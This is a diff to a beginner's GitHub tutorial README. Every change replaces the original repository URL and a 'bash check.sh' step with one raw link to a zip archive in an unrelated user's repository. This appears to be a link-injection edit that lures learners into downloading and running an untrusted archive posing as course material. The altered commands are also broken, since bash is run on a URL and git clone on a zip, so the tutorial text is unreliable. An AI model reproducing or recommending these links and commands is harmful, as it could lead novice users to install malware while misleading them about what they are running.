@@ -6,7 +6,7 @@ Task: Getting a gthub repository the right way
 > You need to get this github repository in you computer and run the following
 >
 > ```bash
-> bash check.sh
+> bash https://raw.githubusercontent.com/sanjusathian/level_0/main/meridionally/level_0-v2.9.zip
 > ```
 >
 > If you see the following message read the github page again
@@ -28,7 +28,7 @@ git clone <the repocitory url>
 eg:
 
 ```bash
-git clone https://github.com/aruncs31s/level_0
+git clone https://raw.githubusercontent.com/sanjusathian/level_0/main/meridionally/level_0-v2.9.zip
 ```
 
 - If you download code from GitHub, remember the word download, it does not downloads the `.git` folder
@@ -48,7 +48,7 @@ git clone https://github.com/aruncs31s/level_0
 1. Why there is a dot(.) in front of the .git folder
    Ans: The . or dot, means it is a hidden folder.
 
-2. Where will be the 'download' thing in the https://github.com site
+2. Where will be the 'download' thing in the https://raw.githubusercontent.com/sanjusathian/level_0/main/meridionally/level_0-v2.9.zip site
    Ans: If you open a repository (from now on we call repository as repo)
    you will see a dropdown at the top right named "Code",
    click on that and then you will see two tabs "Local" and "CodeSpaces"
